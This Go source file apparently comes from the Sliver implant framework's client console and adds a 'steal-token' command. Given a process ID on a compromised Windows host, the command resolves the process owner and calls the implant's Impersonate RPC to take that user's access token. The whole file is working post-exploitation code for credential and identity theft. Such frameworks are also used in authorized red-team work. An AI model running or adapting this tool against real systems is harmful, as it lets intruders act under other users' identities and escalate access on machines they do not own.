package privilege

/*
	Sliver Implant Framework - Enhanced Token Operations
	Copyright (C) 2024  Bishop Fox / mgstate

	Steal token from a process by PID - resolves the process owner
	and calls Impersonate with the username for a seamless workflow.
*/

import (
	"context"
	"strconv"

	"google.golang.org/protobuf/proto"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// StealTokenCmd - Steal a token from a process by PID
func StealTokenCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	if len(args) < 1 {
		con.PrintErrorf("Usage: steal-token <PID>\n")
		con.PrintInfof("Tip: use 'ps' to list processes, then steal-token <PID>\n")
		return
	}

	pid, err := strconv.ParseInt(args[0], 10, 32)
	if err != nil {
		con.PrintErrorf("Invalid PID: %s\n", args[0])
		return
	}

	// Step 1: Get process list to resolve PID -> username
	ctrl := make(chan bool)
	con.SpinUntil("Looking up process owner ...", ctrl)

	psList, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: con.ActiveTarget.Request(cmd),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("Failed to list processes: %s\n", err)
		return
	}

	// Find the target process
	var targetOwner string
	var targetExe string
	for _, proc := range psList.Processes {
		if proc.Pid == int32(pid) {
			targetOwner = proc.Owner
			targetExe = proc.Executable
			break
		}
	}

	if targetOwner == "" {
		con.PrintErrorf("PID %d not found or no owner info available\n", pid)
		con.PrintInfof("Try: ps | grep <process> to find valid PIDs\n")
		return
	}

	con.PrintInfof("PID %d -> %s (owner: %s)\n", pid, targetExe, targetOwner)

	// Step 2: Extract just the username (strip domain prefix if present)
	username := targetOwner
	// Owner format is typically "DOMAIN\username"
	for i := len(username) - 1; i >= 0; i-- {
		if username[i] == '\\' {
			username = username[i+1:]
			break
		}
	}

	con.PrintInfof("Impersonating %s ...\n", targetOwner)

	// Step 3: Call Impersonate with the resolved username
	stealToken, err := con.Rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
		Request:  con.ActiveTarget.Request(cmd),
		Username: username,
	})

	if err != nil {
		con.PrintErrorf("Token steal failed: %s\n", err)
		return
	}

	if stealToken.Response != nil && stealToken.Response.Async {
		con.AddBeaconCallback(stealToken.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, stealToken)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintStealToken(stealToken, int32(pid), targetOwner, con)
		})
		con.PrintAsyncResponse(stealToken.Response)
	} else {
		PrintStealToken(stealToken, int32(pid), targetOwner, con)
	}
}

// PrintStealToken - Print the result of token steal
func PrintStealToken(result *sliverpb.Impersonate, pid int32, owner string, con *console.SliverClient) {
	if result.Response != nil && result.Response.GetErr() != "" {
		con.PrintErrorf("Token steal from PID %d (%s) failed: %s\n", pid, owner, result.Response.GetErr())
		return
	}
	con.PrintInfof("Successfully stole token from PID %d (%s)\n", pid, owner)
	con.PrintInfof("Use 'whoami' to verify, 'rev2self' to revert\n")
}
